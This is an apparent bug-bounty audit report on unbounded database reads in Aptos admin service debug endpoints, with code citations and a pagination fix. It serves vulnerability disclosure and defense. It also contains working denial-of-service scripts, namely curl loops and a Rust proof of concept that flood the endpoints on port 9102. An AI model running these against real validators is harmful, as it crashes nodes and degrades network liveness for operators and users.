# Audit Report

## Title
Unbounded Database Reads in Admin Service Consensus DB Dump Endpoints Leading to Memory Exhaustion and Validator Crashes

## Summary
The Admin Service consensus database dump endpoints (`/debug/consensus/consensusdb`, `/debug/consensus/quorumstoredb`, and `/debug/consensus/block`) load entire databases into memory without pagination or size limits. On testnet/devnet where the Admin Service is enabled by default without authentication, an unprivileged attacker can trigger memory exhaustion and crash validator nodes by repeatedly calling these endpoints.

## Finding Description

The Admin Service exposes three consensus database dump endpoints that violate the **Resource Limits** invariant by performing unbounded database reads: [1](#0-0) 

### Attack Vector 1: Consensus DB Dump (`/debug/consensus/consensusdb`)

The `handle_dump_consensus_db_request` handler calls `dump_consensus_db()` which loads ALL blocks and ALL quorum certificates from the database without any limits: [2](#0-1) 

The underlying `get_data()` method retrieves all blocks and QCs by calling `get_all()`: [3](#0-2) 

The `get_all()` implementation iterates through the entire column family: [4](#0-3) 

### Attack Vector 2: Quorum Store DB Dump (`/debug/consensus/quorumstoredb`)

When called without a `digest` parameter, `dump_quorum_store_db()` loads ALL batches into a HashMap: [5](#0-4) 

The `get_all_batches()` implementation loads all batches into memory: [6](#0-5) 

With batches up to 1MB each (`sender_max_batch_bytes = 1024 * 1024 - 160`) and `db_quota = 300_000_000` bytes, this can load hundreds of megabytes: [7](#0-6) 

### Attack Vector 3: Block Dump (`/debug/consensus/block`)

When called without a `block_id` parameter, `dump_blocks()` and `dump_blocks_bcs()` load ALL batches and ALL blocks into memory: [8](#0-7) 

### Authentication Bypass on Testnet/Devnet

The Admin Service is **enabled by default on testnet/devnet without authentication**: [9](#0-8) 

When `authentication_configs` is empty, all requests are allowed: [10](#0-9) 

### Exploitation Path

1. Attacker identifies a testnet/devnet validator with Admin Service enabled (default port 9102)
2. On a long-running validator, the consensus databases accumulate thousands of blocks, QCs, and batches
3. Attacker sends HTTP GET requests to:
   - `http://validator:9102/debug/consensus/consensusdb`
   - `http://validator:9102/debug/consensus/quorumstoredb`
   - `http://validator:9102/debug/consensus/block`
4. Each request loads the entire database into memory and serializes it to String/bytes
5. Repeated requests exhaust available memory
6. The validator process crashes due to OOM (Out of Memory)
7. Validator experiences downtime, affecting network liveness

## Impact Explanation

This vulnerability meets **High Severity** criteria per the Aptos Bug Bounty program:

- **Validator node slowdowns**: Loading gigabytes of data into memory causes severe performance degradation
- **API crashes**: Memory exhaustion leads to process termination
- **Significant protocol violations**: Breaks the Resource Limits invariant stating "All operations must respect gas, storage, and computational limits"

**Impact Scope:**
- All testnet/devnet validators running default configurations are vulnerable
- Mainnet validators with misconfigured authentication (enabled but weak passcode) are at risk
- Even with proper authentication, legitimate administrators can accidentally DoS their own nodes

**Damage Assessment:**
- Single validator crash reduces network capacity and increases latency
- Coordinated attacks against multiple validators could severely degrade network performance
- Recovery requires manual node restart and potential configuration changes

## Likelihood Explanation

**Likelihood: HIGH**

**Factors increasing likelihood:**
1. **Default Configuration**: Admin Service is automatically enabled on testnet/devnet without operator intervention
2. **No Authentication Required**: Testnet/devnet validators accept unauthenticated requests by default
3. **Low Attacker Skill**: Simple HTTP GET requests, no special tools or deep protocol knowledge required
4. **Wide Attack Surface**: All public-facing testnet/devnet validators are vulnerable
5. **Predictable Endpoint**: Well-documented debug endpoints at standard port 9102
6. **Long-Running Validators**: Databases grow over time, making the attack more effective

**Factors decreasing likelihood:**
1. Mainnet has authentication requirements (but misconfigurations are common)
2. Some operators may disable Admin Service or firewall the port

**Realistic Attack Scenario:**
```
# Simple attack using curl
for i in {1..100}; do
  curl http://testnet-validator:9102/debug/consensus/consensusdb &
  curl http://testnet-validator:9102/debug/consensus/quorumstoredb &
  curl http://testnet-validator:9102/debug/consensus/block &
done
```

## Recommendation

### Immediate Mitigations

1. **Disable Admin Service by default on all networks** or require explicit authentication even on testnet
2. **Add firewall rules** to restrict Admin Service access to trusted IPs only

### Long-term Fixes

Implement pagination and size limits for all database dump endpoints:

```rust
// Add pagination parameters to the request
pub async fn handle_dump_consensus_db_request(
    req: Request<Body>,
    consensus_db: Arc<dyn PersistentLivenessStorage>,
) -> hyper::Result<Response<Body>> {
    let query = req.uri().query().unwrap_or("");
    let query_pairs: HashMap<_, _> = 
        url::form_urlencoded::parse(query.as_bytes()).collect();
    
    // Extract pagination parameters
    let offset: usize = query_pairs
        .get("offset")
        .and_then(|v| v.parse().ok())
        .unwrap_or(0);
    let limit: usize = query_pairs
        .get("limit")
        .and_then(|v| v.parse().ok())
        .unwrap_or(100)
        .min(1000); // Maximum 1000 items per request
    
    match spawn_blocking(move || {
        dump_consensus_db_paginated(consensus_db.as_ref(), offset, limit)
    }).await {
        // ... rest of handler
    }
}

// Implement paginated database reads
fn dump_consensus_db_paginated(
    consensus_db: &dyn PersistentLivenessStorage,
    offset: usize,
    limit: usize,
) -> anyhow::Result<String> {
    let mut body = String::new();
    
    // Use range queries or skip/take instead of loading everything
    let blocks: Vec<Block> = consensus_db
        .consensus_db()
        .get_blocks_paginated(offset, limit)?;
    
    body.push_str(&format!("Blocks (showing {}-{}):\n", 
        offset, offset + blocks.len()));
    
    for block in blocks {
        body.push_str(&format!("[id: {:?}, ...]\n\n", block.id()));
    }
    
    Ok(body)
}
```

### Additional Safeguards

1. **Add size limits**: Reject requests if estimated response size exceeds threshold (e.g., 10MB)
2. **Rate limiting**: Implement per-IP rate limits for admin endpoints
3. **Monitoring**: Alert operators when admin endpoints are accessed frequently
4. **Memory budgets**: Use streaming responses instead of buffering entire result
5. **Mandatory authentication**: Require authentication on all networks, not just mainnet

## Proof of Concept

```rust
// File: crash_validator_poc.rs
// Compile with: cargo test --package aptos-admin-service

use hyper::{Client, Uri};
use std::time::Duration;
use tokio::time::sleep;

#[tokio::test]
async fn test_memory_exhaustion_attack() {
    // Assumes a testnet validator is running at localhost:9102
    let client = Client::new();
    let base_url = "http://localhost:9102";
    
    let endpoints = vec![
        "/debug/consensus/consensusdb",
        "/debug/consensus/quorumstoredb",
        "/debug/consensus/block",
    ];
    
    println!("Starting memory exhaustion attack...");
    
    // Launch 50 concurrent requests to each endpoint
    let mut handles = vec![];
    for _ in 0..50 {
        for endpoint in &endpoints {
            let url = format!("{}{}", base_url, endpoint);
            let client = client.clone();
            
            handles.push(tokio::spawn(async move {
                let uri: Uri = url.parse().unwrap();
                match client.get(uri).await {
                    Ok(response) => {
                        let status = response.status();
                        let body_size = hyper::body::to_bytes(response.into_body())
                            .await
                            .map(|b| b.len())
                            .unwrap_or(0);
                        println!("Response: {} - {} bytes", status, body_size);
                    }
                    Err(e) => println!("Request failed: {}", e),
                }
            }));
            
            // Small delay to avoid overwhelming immediately
            sleep(Duration::from_millis(10)).await;
        }
    }
    
    // Wait for all requests to complete
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Attack complete. Check validator memory usage and logs.");
}

// Alternative bash script for testing:
// #!/bin/bash
// # Save as: attack.sh
// # Usage: chmod +x attack.sh && ./attack.sh
//
// VALIDATOR="testnet-validator:9102"
// ENDPOINTS=(
//     "/debug/consensus/consensusdb"
//     "/debug/consensus/quorumstoredb"
//     "/debug/consensus/block"
// )
//
// echo "Starting DoS attack on $VALIDATOR..."
//
// for i in {1..100}; do
//     for endpoint in "${ENDPOINTS[@]}"; do
//         curl -s "http://$VALIDATOR$endpoint" > /dev/null &
//     done
//     sleep 0.1
// done
//
// echo "Attack launched. Monitor validator with: top -p \$(pgrep aptos-node)"
```

## Notes

**Severity Justification**: This is classified as **High Severity** rather than Critical because:
- It does not directly cause consensus safety violations or permanent state corruption
- Recovery is possible through node restart
- It requires testnet/devnet exposure or mainnet misconfiguration

However, the vulnerability has significant operational impact and could be used to degrade network performance systematically across multiple validators.

**Defense-in-Depth**: Even with authentication enabled, the lack of pagination remains a vulnerability as legitimate operators could accidentally crash their own nodes when debugging large databases. All admin endpoints should implement resource limits regardless of authentication.

### Citations

**File:** crates/aptos-admin-service/src/server/mod.rs (L154-174)
```rust
        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
        } else {
            for authentication_config in &context.config.authentication_configs {
                match authentication_config {
                    AuthenticationConfig::PasscodeSha256(passcode_sha256) => {
                        let query = req.uri().query().unwrap_or("");
                        let query_pairs: HashMap<_, _> =
                            url::form_urlencoded::parse(query.as_bytes()).collect();
                        let passcode: Option<String> =
                            query_pairs.get("passcode").map(|p| p.to_string());
                        if let Some(passcode) = passcode {
                            if sha256::digest(passcode) == *passcode_sha256 {
                                authenticated = true;
                            }
                        }
                    },
                }
            }
        };
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L194-228)
```rust
            (hyper::Method::GET, "/debug/consensus/consensusdb") => {
                let consensus_db = context.consensus_db.read().clone();
                if let Some(consensus_db) = consensus_db {
                    consensus::handle_dump_consensus_db_request(req, consensus_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/consensus/quorumstoredb") => {
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(quorum_store_db) = quorum_store_db {
                    consensus::handle_dump_quorum_store_db_request(req, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Quorum store db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/consensus/block") => {
                let consensus_db = context.consensus_db.read().clone();
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(consensus_db) = consensus_db
                    && let Some(quorum_store_db) = quorum_store_db
                {
                    consensus::handle_dump_block_request(req, consensus_db, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db and/or quorum store db is not available.",
                    ))
                }
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L130-156)
```rust
fn dump_consensus_db(consensus_db: &dyn PersistentLivenessStorage) -> anyhow::Result<String> {
    let mut body = String::new();

    let (last_vote, highest_tc, consensus_blocks, consensus_qcs) =
        consensus_db.consensus_db().get_data()?;

    body.push_str(&format!("Last vote: \n{last_vote:?}\n\n"));
    body.push_str(&format!("Highest tc: \n{highest_tc:?}\n\n"));
    body.push_str("Blocks: \n");
    for block in consensus_blocks {
        body.push_str(&format!(
            "[id: {:?}, author: {:?}, epoch: {}, round: {:02}, parent_id: {:?}, timestamp: {}, payload: {:?}]\n\n",
            block.id(),
            block.author(),
            block.epoch(),
            block.round(),
            block.parent_id(),
            block.timestamp_usecs(),
            block.payload(),
        ));
    }
    body.push_str("QCs: \n");
    for qc in consensus_qcs {
        body.push_str(&format!("{qc:?}\n\n"));
    }
    Ok(body)
}
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L158-177)
```rust
fn dump_quorum_store_db(
    quorum_store_db: &dyn QuorumStoreStorage,
    digest: Option<HashValue>,
) -> anyhow::Result<String> {
    let mut body = String::new();

    if let Some(digest) = digest {
        body.push_str(&format!("{digest:?}:\n"));
        body.push_str(&format!(
            "{:?}",
            quorum_store_db.get_batch(&digest).map_err(Error::msg)?
        ));
    } else {
        for (digest, _batch) in quorum_store_db.get_all_batches()? {
            body.push_str(&format!("{digest:?}:\n"));
        }
    }

    Ok(body)
}
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L179-215)
```rust
fn dump_blocks(
    consensus_db: &dyn PersistentLivenessStorage,
    quorum_store_db: &dyn QuorumStoreStorage,
    block_id: Option<HashValue>,
) -> anyhow::Result<String> {
    let mut body = String::new();

    let all_batches = quorum_store_db.get_all_batches()?;

    let (_, _, blocks, _) = consensus_db.consensus_db().get_data()?;

    for block in blocks {
        let id = block.id();
        if block_id.is_none() || id == block_id.unwrap() {
            body.push_str(&format!("Block ({id:?}): \n\n"));
            match extract_txns_from_block(&block, &all_batches) {
                Ok(txns) => {
                    body.push_str(&format!("{txns:?}"));
                },
                Err(e) => {
                    body.push_str(&format!("Not available: {e:?}"));
                },
            };
            body.push_str("\n\n");
        }
    }

    if body.is_empty() {
        if let Some(block_id) = block_id {
            body.push_str(&format!("Done, block ({block_id:?}) is not found."));
        } else {
            body.push_str("Done, no block is found.");
        }
    }

    Ok(body)
}
```

**File:** consensus/src/consensusdb/mod.rs (L80-106)
```rust
    pub fn get_data(
        &self,
    ) -> Result<(
        Option<Vec<u8>>,
        Option<Vec<u8>>,
        Vec<Block>,
        Vec<QuorumCert>,
    )> {
        let last_vote = self.get_last_vote()?;
        let highest_2chain_timeout_certificate = self.get_highest_2chain_timeout_certificate()?;
        let consensus_blocks = self
            .get_all::<BlockSchema>()?
            .into_iter()
            .map(|(_, block)| block)
            .collect();
        let consensus_qcs = self
            .get_all::<QCSchema>()?
            .into_iter()
            .map(|(_, qc)| qc)
            .collect();
        Ok((
            last_vote,
            highest_2chain_timeout_certificate,
            consensus_blocks,
            consensus_qcs,
        ))
    }
```

**File:** consensus/src/consensusdb/mod.rs (L201-205)
```rust
    pub fn get_all<S: Schema>(&self) -> Result<Vec<(S::Key, S::Value)>, DbError> {
        let mut iter = self.db.iter::<S>()?;
        iter.seek_to_first();
        Ok(iter.collect::<Result<Vec<(S::Key, S::Value)>, AptosDbError>>()?)
    }
```

**File:** consensus/src/quorum_store/quorum_store_db.rs (L103-108)
```rust
    fn get_all_batches(&self) -> Result<HashMap<HashValue, PersistedValue<BatchInfo>>> {
        let mut iter = self.db.iter::<BatchSchema>()?;
        iter.seek_to_first();
        iter.map(|res| res.map_err(Into::into))
            .collect::<Result<HashMap<HashValue, PersistedValue<BatchInfo>>>>()
    }
```

**File:** config/src/config/quorum_store_config.rs (L113-135)
```rust
            sender_max_batch_txns: DEFEAULT_MAX_BATCH_TXNS,
            // TODO: on next release, remove BATCH_PADDING_BYTES
            sender_max_batch_bytes: 1024 * 1024 - BATCH_PADDING_BYTES,
            sender_max_num_batches: DEFAULT_MAX_NUM_BATCHES,
            sender_max_total_txns: 1500,
            // TODO: on next release, remove DEFAULT_MAX_NUM_BATCHES * BATCH_PADDING_BYTES
            sender_max_total_bytes: 4 * 1024 * 1024 - DEFAULT_MAX_NUM_BATCHES * BATCH_PADDING_BYTES,
            receiver_max_batch_txns: 100,
            receiver_max_batch_bytes: 1024 * 1024 + BATCH_PADDING_BYTES,
            receiver_max_num_batches: 20,
            receiver_max_total_txns: 2000,
            receiver_max_total_bytes: 4 * 1024 * 1024
                + DEFAULT_MAX_NUM_BATCHES
                + BATCH_PADDING_BYTES,
            batch_request_num_peers: 5,
            batch_request_retry_limit: 10,
            batch_request_retry_interval_ms: 500,
            batch_request_rpc_timeout_ms: 5000,
            batch_expiry_gap_when_init_usecs: Duration::from_secs(60).as_micros() as u64,
            remote_batch_expiry_gap_when_init_usecs: Duration::from_millis(500).as_micros() as u64,
            memory_quota: 120_000_000,
            db_quota: 300_000_000,
            batch_quota: 300_000,
```

**File:** config/src/config/admin_service_config.rs (L84-106)
```rust
impl ConfigOptimizer for AdminServiceConfig {
    fn optimize(
        node_config: &mut NodeConfig,
        _local_config_yaml: &Value,
        _node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<bool, Error> {
        let mut modified_config = false;

        if node_config.admin_service.enabled.is_none() {
            // Only enable the admin service if the chain is not mainnet
            let admin_service_enabled = if let Some(chain_id) = chain_id {
                !chain_id.is_mainnet()
            } else {
                false // We cannot determine the chain ID, so we disable the admin service
            };
            node_config.admin_service.enabled = Some(admin_service_enabled);

            modified_config = true; // The config was modified
        }

        Ok(modified_config)
    }
```
